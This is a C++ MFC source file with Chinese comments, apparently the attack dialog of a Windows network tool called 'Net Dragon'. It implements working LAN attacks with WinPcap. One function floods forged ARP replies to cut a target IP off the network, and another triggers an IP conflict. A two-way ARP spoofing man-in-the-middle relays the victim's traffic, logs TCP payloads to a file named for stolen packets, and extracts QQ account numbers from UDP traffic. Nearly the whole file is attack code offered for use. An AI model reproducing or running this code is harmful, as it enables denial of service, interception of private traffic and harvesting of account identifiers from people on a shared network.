// AttackDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Net Dragon.h"
#include "AttackDlg.h"
#include "pcap.h"
#include <Iphlpapi.h>
#include "RecordData.h"


//使目标机器断线的一些变量
unsigned char destination_ethernet_address[6];  // 目标mac地址
unsigned char source_ethernet_address[6];      //伪装的mac地址
unsigned char realdst_ethernet_address[6];    //目标主机真实的MAC
char gateway_ip[16];                        //伪装的IP地址
char destinationip_addr[16];               //目标IP
char sendbuf[256];
char sendbuff2[256];
char error[PCAP_ERRBUF_SIZE];
UINT intertime = 0;
bool stopsend = true;


//ARP欺骗用
typedef struct _ARPSPOOF
{
	unsigned char	ucSelfMAC[6]; // self MAC
	unsigned char	szTarget[16]; // target IP Address
	unsigned char	ucTargetMAC[6]; // target MAC
	unsigned char	szIP[16]; // IP2's IP
	unsigned char	ucIPMAC[6]; //IP2's TRUE MAC used to restor local arp cache
	unsigned char	ucPretendMAC[6]; //IP2's Pretend MAC
	

} ARPSPOOF, *PARPSPOOF;


// 对应ARPSPOOF结构中的成员
unsigned char ucSelf[6], ucIPA[6], ucIPREAL[6];
char szIPSelf[16], szIPA[16];
bool ischeatingarp = false;
bool isrenew = false;

CRecordData recorddatadlg;
char TcpFlag[6]={ 'F','S','R','P','A','U' }; //定义TCP标志位，分析数据包时用


// CAttackDlg 对话框

IMPLEMENT_DYNAMIC(CAttackDlg, CDialog)

CAttackDlg::CAttackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CAttackDlg::IDD, pParent)
	, m_attackip(_T(""))

	
{


}

CAttackDlg::~CAttackDlg()
{
}

void CAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDITAKIP, m_attackip);


}


BEGIN_MESSAGE_MAP(CAttackDlg, CDialog)
	ON_BN_CLICKED(IDC_SCANHOST, &CAttackDlg::OnBnClickedScanhost)
	ON_BN_CLICKED(IDC_GETLOCALINFORMATION, &CAttackDlg::OnBnClickedGetlocalinformation)
	ON_BN_CLICKED(IDC_OUTLINE, &CAttackDlg::OnBnClickedOutline)
	
	ON_BN_CLICKED(IDC_ARPCHEAT, &CAttackDlg::OnBnClickedArpcheat)
	ON_BN_CLICKED(IDC_SHOWDATA, &CAttackDlg::OnBnClickedShowdata)
	ON_BN_CLICKED(IDC_CONFLICT, &CAttackDlg::OnBnClickedConflict)
	ON_BN_CLICKED(IDC_HELP2, &CAttackDlg::OnBnClickedHelp)
	ON_BN_CLICKED(IDC_OPENDATA, &CAttackDlg::OnBnClickedOpendata)
	
	ON_EN_CHANGE(IDC_EDITINFO, &CAttackDlg::OnEnChangeEditinfo)
	ON_EN_CHANGE(IDC_EDITAKIP, &CAttackDlg::OnEnChangeEditakip)
END_MESSAGE_MAP()


// CAttackDlg 消息处理程序

void CAttackDlg::OnOK()
{
	DestroyWindow();
}

void CAttackDlg::OnCancel()
{
	if (ischeatingarp)
	{
		AfxMessageBox("请先恢复受害者ARP。。。");
		return;
	}
	DestroyWindow();
	
}

void CAttackDlg::OnBnClickedScanhost()
{
	activehostdlg.Create(IDD_SCANDLG,this);
	activehostdlg.ShowWindow(SW_SHOW);
}

bool CAttackDlg::InitArp(void)
{
	intertime = m_sendinterval;
	pETH_t pE;
    pARP_t pA;
	m_forgemac = "AA-BB-CC-DD-EE-FF";
	m_localip = (char*)pAdapterInfo->IpAddressList.IpAddress.String;
	m_localmac.Format("%02x-%02x-%02x-%02x-%02x-%02x",mymac[0],mymac[1],mymac[2],mymac[3],mymac[4],mymac[5]);
    m_gatewayip = (char*)pAdapterInfo->GatewayList.IpAddress.String;
    /////////////////////////////////////////////
    ////////初始化数据
	UpdateData(true);
    sscanf(m_gatewaymac,"%x-%x-%x-%x-%x-%x",&destination_ethernet_address[0],&destination_ethernet_address[1],&destination_ethernet_address[2],&destination_ethernet_address[3],&destination_ethernet_address[4],&destination_ethernet_address[5]);
    sscanf(m_forgemac,"%x-%x-%x-%x-%x-%x",&source_ethernet_address[0],&source_ethernet_address[1],&source_ethernet_address[2],&source_ethernet_address[3],&source_ethernet_address[4],&source_ethernet_address[5]);
    sscanf(m_localmac,"%x-%x-%x-%x-%x-%x",&realdst_ethernet_address[0],&realdst_ethernet_address[1],&realdst_ethernet_address[2],&realdst_ethernet_address[3],&realdst_ethernet_address[4],&realdst_ethernet_address[5]);
    strcpy(destinationip_addr,m_gatewayip);
    strcpy(gateway_ip,m_localip);

    /////////////////////////////////////////////
    ////////包构造

    memset( sendbuf , 0 , 256 );
    pE = (pETH_t)sendbuf ;
    pA = (pARP_t)pE->data;
    pE->ether_type = htons( ETH_TYPE );
    pA->arp_hardware_type = htons( ARP_HARDWARE );
    pA->arp_protocol_type = htons( IP_TYPE );
    pA->arp_operation_code = htons( ARP_REPLY );
    pA->arp_hardware_length = MAC_ADDR_LEN;
    pA->arp_protocol_length = IP_ADDR_LEN;
    memcpy( pE->ether_dhost  ,destination_ethernet_address , 6);
    memcpy( pA->arp_destination_ethernet_address ,destination_ethernet_address , 6);
    pA->arp_destination_ip_address = inet_addr( destinationip_addr );
   
    memcpy( pE->ether_shost  ,source_ethernet_address , 6);
    memcpy( pA->arp_source_ethernet_address ,source_ethernet_address , 6);
    return true;
}

void CAttackDlg::OnBnClickedGetlocalinformation()
{
	

}

BOOL CAttackDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
	m_sendinterval = 900;
	recorddatadlg.Create(IDD_SHOWDATA,this );
	m_localip = (char*)pAdapterInfo->IpAddressList.IpAddress.String;
	m_gatewayip = (char*)pAdapterInfo->GatewayList.IpAddress.String;
	m_gatewaymac.Format("%02x-%02x-%02x-%02x-%02x-%02x",gatewaymac[0],gatewaymac[1],gatewaymac[2],gatewaymac[3],gatewaymac[4],gatewaymac[5]);
	m_localmac.Format("%02x-%02x-%02x-%02x-%02x-%02x",mymac[0],mymac[1],mymac[2],mymac[3],mymac[4],mymac[5]);
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


/******************************************************************
 * 断开网络模块
 *****************************************************************/
void CAttackDlg::OnBnClickedOutline()
{
	// 开始运行
    UpdateData(true);
	if (m_attackip.IsEmpty() || inet_addr(m_attackip) == INADDR_NONE)
	{
		AfxMessageBox(_T("请先填写正确的被攻击者IP"));
		return;
	}
	attackip = m_attackip;
		
    if (stopsend==true)
    {
        stopsend = false;
        if (!InitArp())
            return;
        //变化量
        ((CButton*)GetDlgItem(IDC_OUTLINE))->SetWindowText(_T("停止攻击"));
        
        CWinThread* m_pWinThread = AfxBeginThread(SendArpPacket,_T("arpattack"),THREAD_PRIORITY_NORMAL,0,0,0);
        m_pWinThread->m_bAutoDelete = true;
    }
    else
    {
        stopsend = true;
        ((CButton*)GetDlgItem(IDC_OUTLINE))->SetWindowText(_T("断开网络"));
        
    }
 
}

UINT SendArpPacket(LPVOID lpParam )
{
    char runbuf[256];
    pcap_t *fp;
    pETH_t pEth;
    pARP_t pArp;
    pEth = (pETH_t)runbuf ;
    pArp = (pARP_t)pEth->data;
    CString strParam;
    int m_localinter = 0;
    int i =0 ;
    memcpy(runbuf,sendbuf,256*sizeof(char));
    m_localinter = intertime / 500;
    strParam = (LPCTSTR)lpParam;
	if( (fp = pcap_open_live( pAdapterInfo->AdapterName , 100, 0, 1000, error ) ) == NULL)//非混杂模式
    {
        AfxMessageBox(_T("打开网卡句柄失败！请检查是否安装了最新的WinPcap或者填写了正确的设置。"));
        return 0 ;
     }

    /////////////////////////////////////////////
    ////////发包
    if (strParam == _T("arpattack"))
    {
        /////////////////////欺骗
        while(!stopsend)
        {
            //////////////////////////DEBUG

            pArp->arp_source_ip_address = inet_addr(attackip);
            pcap_sendpacket( fp, (u_char*)runbuf,  sizeof( ETH_t )+sizeof( ARP_t ) -1  );
           
            if (intertime < 1000)
            {
                Sleep(intertime);
            }
            else
            {
                for(i=0;i<m_localinter;i++)
                {
                    if (stopsend)
                        break;
                    Sleep(500);
                }
            }
		}
		pcap_close( fp );
    }
    return 0;
}

/************************************************************
**  窃听网络数据、QQ窃听
************************************************************/
void CAttackDlg::OnBnClickedArpcheat()
{   
	
	UpdateData(true);

	if (m_attackip.IsEmpty() || inet_addr(m_attackip) == INADDR_NONE)
	{
		AfxMessageBox(_T("请先填写正确的被攻击者IP!"));
		return;
	}

	char restore[40];
	ischeatingarp = !ischeatingarp;
    isrenew = false;
    
	memset(ucIPA, 0xff, 6);		//target MAC
	memset(ucIPREAL, 0xff, 6);	//IP2's TRUE MAC used to restor local arp cache
	memset(szIPA, 0 ,16);		//target IP Address
	memset(ucSelf, 0xff, 6);
	memset(szIPSelf, 0 ,16);
	ULONG macAddLen=6;
	HANDLE hThread[2];			//两个恢复线程的句柄
	sscanf(m_gatewaymac,"%x-%x-%x-%x-%x-%x",&ucIPA[0],&ucIPA[1],&ucIPA[2],&ucIPA[3],&ucIPA[4],&ucIPA[5]);
    sscanf(m_localmac,"%x-%x-%x-%x-%x-%x",&ucSelf[0],&ucSelf[1],&ucSelf[2],&ucSelf[3],&ucSelf[4],&ucSelf[5]);
    strcpy(szIPA,m_gatewayip);
    strcpy(szIPSelf,m_localip);

	if (ischeatingarp)
    {
		if ( !(SendARP(inet_addr(m_attackip), (IPAddr) NULL,(PULONG) ucIPREAL, &macAddLen) == NO_ERROR) && ischeatingarp){
			AfxMessageBox("获得目标MAC地址失败,请检查网络或者此IP地址是否在线");
			return;
		}

		if (ischeatingarp){
			this->GetDlgItem(IDC_ARPCHEAT)->SetWindowText("停止窃听");
		}

		PARPSPOOF arpspoof1 = (PARPSPOOF) malloc(sizeof(ARPSPOOF));
		
		// 欺骗网关,受害者是attackip.
		memcpy(arpspoof1->ucSelfMAC, ucSelf, 6);
		strcpy((char *) arpspoof1->szTarget, szIPA);	//网关IP
		memcpy(arpspoof1->ucTargetMAC, ucIPA, 6);		//网关MAC
		strcpy((char *) arpspoof1->szIP, m_attackip);	//受害者IP
		memcpy(arpspoof1->ucIPMAC, ucIPREAL, 6);		//受害者真实IP,用于恢复ARP缓存
		memcpy(arpspoof1->ucPretendMAC, ucSelf, 6);		//伪装成自己的MAC
   		CWinThread* m_pWinThread1 = AfxBeginThread(SpoofThread,(LPVOID) arpspoof1,THREAD_PRIORITY_NORMAL,0,0,0);
		m_pWinThread1->m_bAutoDelete = true;

		PARPSPOOF arpspoof2 = (PARPSPOOF) malloc(sizeof(ARPSPOOF));
		
		//欺骗attackip,伪装自己是网关
		memcpy(arpspoof2->ucSelfMAC, ucSelf, 6);
		strcpy((char *) arpspoof2->szTarget, m_attackip);//受害者的IP
		memcpy(arpspoof2->ucTargetMAC, ucIPREAL, 6);//受害者MAC
		strcpy((char *) arpspoof2->szIP, szIPA);//网关IP
		memcpy(arpspoof2->ucIPMAC, ucIPA, 6);//网关MAC,用于恢复ARP缓存
		memcpy(arpspoof2->ucPretendMAC, ucSelf, 6);//伪装成自己的MAC
		CWinThread* m_pWinThread2 = AfxBeginThread(SpoofThread,(LPVOID) arpspoof2,THREAD_PRIORITY_NORMAL,0,0,0);
		m_pWinThread2->m_bAutoDelete = true;

		//打开监听线程
		CWinThread* m_pWinThread3 = AfxBeginThread(ListenThread,(LPVOID) GetDlgItem(IDC_EDITINFO),THREAD_PRIORITY_NORMAL,0,0,0);
		m_pWinThread3->m_bAutoDelete = true;
	
	}
	else if (!ischeatingarp)
	{
		/* 重置ARP欺骗，恢复受骗主机的ARP cache.和ARPSpoof做相反操作*/ 
		
		if ( !(SendARP(inet_addr(m_attackip), (IPAddr) NULL,(PULONG) ucIPREAL, &macAddLen) == NO_ERROR))
			AfxMessageBox("获得目标MAC地址失败,请检查网络或者此IP地址是否在线");
		
		this->GetDlgItem(IDC_ARPCHEAT)->EnableWindow(false);
		//恢复网关
		isrenew = true;

		PARPSPOOF arpspoof3 = (PARPSPOOF) malloc(sizeof(ARPSPOOF));
		strcpy((char *) arpspoof3->szTarget, szIPA);
		memcpy(arpspoof3->ucTargetMAC, ucIPA, 6);
		strcpy((char *) arpspoof3->szIP, m_attackip);
		memcpy(arpspoof3->ucIPMAC, ucIPREAL, 6);
		memcpy(arpspoof3->ucPretendMAC, ucIPREAL, 6);
		memcpy(arpspoof3->ucSelfMAC, ucSelf, 6);
		hThread[0] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread2,(LPVOID) arpspoof3, NULL, NULL);
		Sleep(200);//等待参数传递完毕
		//恢复受害者
		strcpy((char *) arpspoof3->szTarget, m_attackip);
		memcpy(arpspoof3->ucTargetMAC, ucIPREAL, 6);
		strcpy((char *) arpspoof3->szIP, szIPA);
		memcpy(arpspoof3->ucIPMAC, ucIPA, 6);
		memcpy(arpspoof3->ucPretendMAC, ucIPA, 6);
		memcpy(arpspoof3->ucSelfMAC, ucSelf, 6);
		hThread[1] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SpoofThread2,(LPVOID) arpspoof3, NULL, NULL);
	    
		for (int j =5;j >0 ;j--)
		{
			sprintf(restore,"恢复受害者ARP中,请稍侯...%d",j);
			this->GetDlgItem(IDC_STATICSTATE)->SetWindowText(restore);
			Sleep(1000);//等待恢复
		}
		this->GetDlgItem(IDC_STATICSTATE)->SetWindowTextA("恢复成功！");
		this->GetDlgItem(IDC_ARPCHEAT)->SetWindowText("窃取数据");
		TerminateThread(hThread[0], 0);	
		TerminateThread(hThread[1], 0);
		this->GetDlgItem(IDC_ARPCHEAT)->EnableWindow(true);
		isrenew = false;
		remove("窃取的数据报.txt");
	}
}
 

UINT SpoofThread(LPVOID lparam)
{	
	ARPSPOOF arpspoof;
	memcpy(&arpspoof, (PARPSPOOF) lparam, sizeof(ARPSPOOF));
	u_char ucFrame[256];
	pETH_t eh = { 0 };
    pARP_t ah = { 0 };
	memset( ucFrame , 0 , 256 );
    eh = (pETH_t)ucFrame ;
    ah = (pARP_t)eh->data;
	pcap_t *adhandle;
	if( (adhandle = pcap_open_live( pAdapterInfo->AdapterName , 65536, 1, 1000, error ) ) == NULL)//混杂模式
    {
         AfxMessageBox(_T("打开网卡句柄失败！请检查是否安装了最新的WinPcap或者填写了正确的设置。"));
         return 0;
    }

	// 设置Ethernet头
	memcpy(eh->ether_dhost, arpspoof.ucTargetMAC, 6);
	memcpy(eh->ether_shost, arpspoof.ucSelfMAC, 6);
	eh->ether_type = htons( ETH_TYPE );
    
	// 设置Arp头
	ah->arp_hardware_type = htons( ARP_HARDWARE );
	ah->arp_protocol_type = htons( IP_TYPE );
	ah->arp_hardware_length = 6;
	ah->arp_protocol_length = 4;
	ah->arp_operation_code = htons( ARP_REPLY );

	memcpy(ah->arp_source_ethernet_address, arpspoof.ucPretendMAC, 6); //伪装成自己的地址
	ah->arp_source_ip_address = inet_addr((char *) arpspoof.szIP);  //受害者IP
	memcpy(ah->arp_destination_ethernet_address, arpspoof.ucTargetMAC, 6);//Destination A's MAC address
	ah->arp_destination_ip_address = inet_addr((char *) arpspoof.szTarget);   //Destination A's IP address
    
	//开始欺骗
	while(ischeatingarp)
	{
		pcap_sendpacket(adhandle, (const unsigned char *)ucFrame,  sizeof( ETH_t )+sizeof( ARP_t ) -1);
		
        Sleep(500);
	}
	pcap_close( adhandle );
    return 0;
		
}

BOOL StaticARP(unsigned char szIPAddr[], BYTE bPhysAddr[])
{
	MIB_IPFORWARDROW ipfrow;
	MIB_IPNETROW iprow;
	DWORD dwIPAddr = inet_addr((char *) szIPAddr);
	if (GetBestRoute(dwIPAddr, ADDR_ANY, &ipfrow) != NO_ERROR)
		return (-1);
	memset(&iprow, 0, sizeof(iprow));
	iprow.dwIndex = ipfrow.dwForwardIfIndex;
	iprow.dwPhysAddrLen = 6;
	memcpy(iprow.bPhysAddr, bPhysAddr, 6);
	iprow.dwAddr = dwIPAddr;
	iprow.dwType = 4;	/* - static */

	if (CreateIpNetEntry(&iprow) != NO_ERROR)
		return TRUE;
	return FALSE;
}


void CAttackDlg::OnBnClickedShowdata()
{
	// TODO: 在此添加控件通知处理程序代码
	recorddatadlg.ShowWindow(SW_SHOW);
	

}

/**********************************************************
 *  窃听数据模块 
 **********************************************************/
UINT ListenThread(LPVOID lpParam)
{
	int k;

	CEdit *pinfo = (CEdit*)lpParam;
	pcap_t *pfp;
	struct pcap_pkthdr *pkt_header;
    u_char *pkt_data;
	ETH_t *eh;
    IPHeader *ih;
    TCPHeader *th;

    u_int ip_len;
	char szSource[16],szDest[16];
    u_short sport, dport;
	unsigned long packet=0;//数据包统计
	static u_int QQ_Num = 0;//QQ号
	char info[1000];
    
	
	while(ischeatingarp)
    {
        if((pfp = pcap_open_live( pAdapterInfo->AdapterName , 65536, 1, 1, error  ) ) == NULL )//混杂模式
        {
            AfxMessageBox(_T("无法打开当前网卡!\r\n\r\n请确定WinPcap驱动已经正常安装.压缩包里自带了Winpcap的安装程序,请先安装."));
            ischeatingarp = false;
            exit(1);
        }
		sprintf(info,"截获的数据包: %ld\r\n截获的QQ号码: %ld",packet,QQ_Num);
        pinfo->SetWindowText(_T(info));
		while( ischeatingarp && (k=pcap_next_ex(pfp,&pkt_header,(const u_char**)&pkt_data))>=0 )//相当于回调函数的功能哈
        {
		     if (k==0)
                continue;
			 eh = (ETH_t *) pkt_data;
			 if(eh->ether_type != htons(ETHERTYPE_IP))//只转发IP包
		        continue;
			 ih = (IPHeader *) (pkt_data + 14); //找到IP头的位置,14为以太头的长度
	         ip_len = (ih->iphVerLen & 0xf) * 4; 
	         th = (TCPHeader *) ((u_char*)ih + ip_len); // 找到TCP的位置
			 // 将端口信息从网络型转变为主机顺序
	         sport = ntohs(th->sourcePort);
	         dport = ntohs(th->destinationPort );
			 // 得到源IP地址，目标IP地址
	         wsprintf(szSource, "%d.%d.%d.%d",
		     ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
		     ih->ipSourceByte.byte3, ih->ipSourceByte.byte4);
	         wsprintf(szDest, "%d.%d.%d.%d",
		     ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
		     ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4);
			 // 开始过滤要转发的数据包
	         if (strcmp(szDest, szIPSelf) != 0 && memcmp(ucSelf, eh->ether_dhost,6) == 0)//取出欺骗所得的包
			 {
				 packet++;

		         //恢复网关发过来的数据报
		         if (memcmp(eh->ether_shost, ucIPA, 6) == 0)
		         {
			     // 修改以太网头
			      memcpy(eh->ether_shost, eh->ether_dhost, 6);//发送端MAC改为自己MAC
			      memcpy(eh->ether_dhost, ucIPREAL, 6);//目的地址改为受害者真实MAC
                    if (ih->ipProtocol == PROTO_TCP)
			        {
                    AnalyzePacket(pkt_data, pkt_header->len);
				    }
					pcap_sendpacket(pfp, (const unsigned char *) pkt_data, pkt_header->len);
			        
				 }

			     //恢复受害者发送过来的数据包
			     else if (memcmp(eh->ether_shost, ucIPREAL, 6) == 0)
                 {
			       memcpy(eh->ether_shost, eh->ether_dhost, 6);
			       memcpy(eh->ether_dhost, ucIPA, 6);

			         if (ih->ipProtocol == PROTO_TCP)
			         {
		             AnalyzePacket(pkt_data, pkt_header->len);
				     }
			         pcap_sendpacket(pfp, (const unsigned char *) pkt_data, pkt_header->len);
				 }
				 //分析数据包,窃取QQ号
				 if (ih->ipProtocol == PROTO_UDP)
			     {
					 UDPHeader *udp_protocol;
					 u_short source_port;//源端口号
					 u_short destination_port; // 目的端口号
					 u_short length;//长度
					 udp_protocol = (UDPHeader *)(pkt_data + 14+20);//获得UDP协议数据内容
					 source_port = ntohs(udp_protocol->udp_source_port);//获得源端口号
					 destination_port = ntohs(udp_protocol->udp_destination_port); //获得目的端口号
					 length = ntohs(udp_protocol->udp_length);//获得长度
					 if((length!=0)&&(destination_port==8000))
					 {
						 
						  IPHeader *pip_header;//IP协议数据变量
						  QQHeader *qq_protocol;//QQ协议数据变量
						  pip_header=(IPHeader *)(pkt_data + 14);//获得IP协议数据变量
						  qq_protocol = (QQHeader *)(pkt_data + 14+20+8);//获得QQ协议数据变量
						  
						  //判断QQ协议包,取QQ号 如果是01 00表示是发往服务器的包前面tag也是0x02,但QQ号不在原来位置//
						  if((qq_protocol->begin_tag==0x02)&&(qq_protocol->sender_ver==ntohs(0x0100)))
						  {
							  if(QQ_Num!=swapu32( *(unsigned int*)(qq_protocol->data-1)))
							  {
								 QQ_Num=swapu32( *(unsigned int*)(qq_protocol->data-1));
								 sprintf(info,"截获的数据包:%ld\r\n截获的QQ号码: %ld",packet,QQ_Num);
								 pinfo->SetWindowText(_T(info));
							  }
						  }
						  if((qq_protocol->begin_tag==0x02)&&(qq_protocol->sender_ver!=ntohs(0x0100)))
						  {
							  if(QQ_Num!=swapu32( *(unsigned int*)qq_protocol->data))
							  {
								  QQ_Num=swapu32( *(unsigned int*)qq_protocol->data);
		                          sprintf(info,"截获的数据包:%ld\r\n截获的QQ号码: %ld",packet,QQ_Num);
                                  pinfo->SetWindowText(_T(info));
							  }
						  }
						  if((*(u_char*)(&(qq_protocol->begin_tag)+16)==0x02)&&(*(u_short*)(&qq_protocol->sender_ver+8)==ntohs(0x0100)))
						  {
							  if(QQ_Num!=swapu32( *(unsigned int*)(qq_protocol->data+15)))
							  {
								  QQ_Num=swapu32( *(unsigned int*)(qq_protocol->data+15));
		                          sprintf(info,"截获的数据包:%ld\r\n截获的QQ号码: %ld",packet,QQ_Num);
                                  pinfo->SetWindowText(_T(info));
						      }
						  }
					 }
				 }
								  sprintf(info,"截获的数据包:%ld\r\n截获的QQ号码: %ld",packet,QQ_Num);
							   	  pinfo->SetWindowText(_T(info));
			 }
		 
		}
	}
	pcap_close( pfp );
    return 0;	

}

void AnalyzePacket(const u_char *pkt_data, unsigned int pkt_len)
{
	//防止占用内存过大,影响速度
	if (recorddatadlg.m_data.GetLength() > 13000){
		recorddatadlg.m_data.Empty();
	}

	CTime theTime;
	ETH_t *eh;
    IPHeader *ih;
    TCPHeader *th;
    u_int ip_len;
	char szSource[16],szDest[16];
    u_short sport, dport;

	eh = (ETH_t *) pkt_data;
	ih = (IPHeader *) (pkt_data + 14);
	ip_len = (ih->iphVerLen & 0xf) * 4;
	th = (TCPHeader *) ((u_char*)ih + ip_len);

	sport = ntohs(th->sourcePort);
	dport = ntohs(th->destinationPort );

	unsigned char *datatcp = (unsigned char *) ih + sizeof(_IPHeader) 
		+ sizeof(struct _TCPHeader);
	int lentcp = ntohs(ih->ipLength) - (sizeof(_IPHeader) + sizeof(_TCPHeader));

	wsprintf(szSource, "%d.%d.%d.%d",
		ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
		ih->ipSourceByte.byte3, ih->ipSourceByte.byte4);

	wsprintf(szDest, "%d.%d.%d.%d",
		ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
		ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4);

	// 分析数据包
	char szTmpStr[85], szTmpFlag[7];
	szTmpFlag[6] = '\0';//6位标志位
	char next[6] = "\r\n\r\n";

	unsigned char FlagMask = 1;
	for(int i=0; i<6; i++ )
	{
		if ((th->flags) & FlagMask)
			szTmpFlag[i] = TcpFlag[i]; 
		else
			szTmpFlag[i] = '-';
		FlagMask = FlagMask << 1; 
	}
	theTime = CTime::GetCurrentTime();
	sprintf(szTmpStr,"TCP %15s->%-15s Bytes=%-4d TTL=%-3d Port:%d->%d %s",szSource, szDest, lentcp, ih->ipTTL, sport, dport, szTmpFlag);
    recorddatadlg.m_data = "\r\n" + recorddatadlg.m_data;
    recorddatadlg.m_data = szTmpStr + recorddatadlg.m_data;
    recorddatadlg.m_data = theTime.Format("%Y-%b-%d %H:%M:%S") + recorddatadlg.m_data;
	recorddatadlg.UpdateData(false);
	SaveLog(szTmpStr, (unsigned int)strlen(szTmpStr));
	SaveLog(datatcp, lentcp);
	SaveLog(next, 6);


}
BOOL SaveLog(const void *data, unsigned int size)
{
	char szLogfile[50] = "窃取的数据报.txt";
	HANDLE hFile;
	DWORD dwBytes;
	hFile = CreateFile(szLogfile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, 
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	SetFilePointer(hFile, NULL, NULL, FILE_END);
	WriteFile(hFile, data, size, &dwBytes, NULL);
	CloseHandle(hFile);
	return TRUE;
}

unsigned int swapu32(unsigned int n) //u_int网络字节转换
{ 
    // In fact htonl() return it!
    return(((n & 0xff000000) >> 24) | ((n & 0x000000ff) << 24) | ((n & 0x00ff0000) >> 8) | ((n & 0x0000ff00) << 8)); 
}


void CAttackDlg::OnBnClickedConflict()
{
	if (m_attackip.IsEmpty() || inet_addr(m_attackip) == INADDR_NONE)
	{
		AfxMessageBox(_T("请先填写正确的被攻击者IP!"));
		return;
	}

	UpdateData(true);
	
	unsigned char ucconflict[6];
		
	memset( sendbuff2 , 0 , 256 );
	memset(ucconflict, 0xff, sizeof(ucconflict));
	ULONG macAddLen=6;
	if ( !(SendARP(inet_addr(m_attackip), (IPAddr) NULL,(PULONG) ucconflict, &macAddLen) == NO_ERROR))
	{
	   AfxMessageBox("获得目标MAC地址失败,请检查网络或者此IP地址是否在线");
	   return;
	}
	pETH_t pPE;
	pARP_t pPA;


	pPE = (pETH_t)sendbuff2 ;
	pPA = (pARP_t)pPE->data;
	pPE->ether_type = htons( ETH_TYPE );
	memcpy( pPE->ether_dhost  ,ucconflict, 6);
	memcpy( pPA->arp_destination_ethernet_address ,ucconflict, 6);
	pPA->arp_hardware_type = htons( ARP_HARDWARE );
	pPA->arp_protocol_type = htons( IP_TYPE );
	pPA->arp_operation_code = htons( ARP_REPLY );
	pPA->arp_hardware_length = MAC_ADDR_LEN;
	pPA->arp_protocol_length = IP_ADDR_LEN;
	pPA->arp_destination_ip_address = inet_addr( m_attackip );
	pPA->arp_source_ip_address = inet_addr(m_attackip);
	memcpy( pPE->ether_shost  ,mymac , 6);
	memcpy( pPA->arp_source_ethernet_address ,mymac , 6);
	pcap_t *pfp;
    if( (pfp = pcap_open_live( pAdapterInfo->AdapterName , 100, 0, 1000, error ) ) == NULL )
    {
        AfxMessageBox(_T("打开网卡句柄失败！请检查是否安装了最新的WinPcap或者填写了正确的设置。"));
        
    }
    for(int i =0;i<3;i++)
    {
        Sleep(20);
        pcap_sendpacket( pfp, (u_char*)sendbuff2,  sizeof( ETH_t )+sizeof( ARP_t ) -1  );
    }
    ////////////////保护
    pcap_close( pfp );
	
	return;
}


UINT SpoofThread2(LPVOID lparam)
{	
	ARPSPOOF arpspoof;
	memcpy(&arpspoof, (PARPSPOOF) lparam, sizeof(ARPSPOOF));
	u_char ucFrame[256];
	pETH_t eh = { 0 };
    pARP_t ah = { 0 };
	memset( ucFrame , 0 , 256 );
    eh = (pETH_t)ucFrame ;
    ah = (pARP_t)eh->data;
	pcap_t *adhandle;
	if( (adhandle = pcap_open_live( pAdapterInfo->AdapterName , 65536, 1, 1000, error ) ) == NULL)//混杂模式
    {
         AfxMessageBox(_T("打开网卡句柄失败！请检查是否安装了最新的WinPcap或者填写了正确的设置。"));
         return 0;
    }

	// 设置Ethernet头
	memcpy(eh->ether_dhost, arpspoof.ucTargetMAC, 6);
	memcpy(eh->ether_shost, arpspoof.ucSelfMAC, 6);
	eh->ether_type = htons( ETH_TYPE );
    
	// 设置Arp头
	ah->arp_hardware_type = htons( ARP_HARDWARE );
	ah->arp_protocol_type = htons( IP_TYPE );
	ah->arp_hardware_length = 6;
	ah->arp_protocol_length = 4;
	ah->arp_operation_code = htons( ARP_REPLY );

	memcpy(ah->arp_source_ethernet_address, arpspoof.ucPretendMAC, 6); //伪装成自己的地址
	ah->arp_source_ip_address = inet_addr((char *) arpspoof.szIP);  //受害者IP
	memcpy(ah->arp_destination_ethernet_address, arpspoof.ucTargetMAC, 6);//Destination A's MAC address
	ah->arp_destination_ip_address = inet_addr((char *) arpspoof.szTarget);   //Destination A's IP address
    
	//开始欺骗
	while(isrenew)
	{
		pcap_sendpacket(adhandle, (const unsigned char *)ucFrame,  sizeof( ETH_t )+sizeof( ARP_t ) -1);
		
        Sleep(500); 
	}
	pcap_close( adhandle );
    return 0;
		
}
void CAttackDlg::OnBnClickedHelp()
{
	// ::ShellExecute(NULL,"open","攻击模块说明.doc",NULL,NULL,SW_SHOW);
}

void CAttackDlg::OnBnClickedOpendata()
{
	::ShellExecute(NULL,"open","监听数据.txt",NULL,NULL,SW_SHOW);
}


void CAttackDlg::OnEnChangeEditinfo()
{
	// TODO:  如果该控件是 RICHEDIT 控件，则它将不会
	// 发送该通知，除非重写 CDialog::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	// TODO:  在此添加控件通知处理程序代码
}

void CAttackDlg::OnEnChangeEditakip()
{
	// TODO:  如果该控件是 RICHEDIT 控件，则它将不会
	// 发送该通知，除非重写 CDialog::OnInitDialog()
	// 函数并调用 CRichEditCtrl().SetEventMask()，
	// 同时将 ENM_CHANGE 标志“或”运算到掩码中。

	// TODO:  在此添加控件通知处理程序代码
}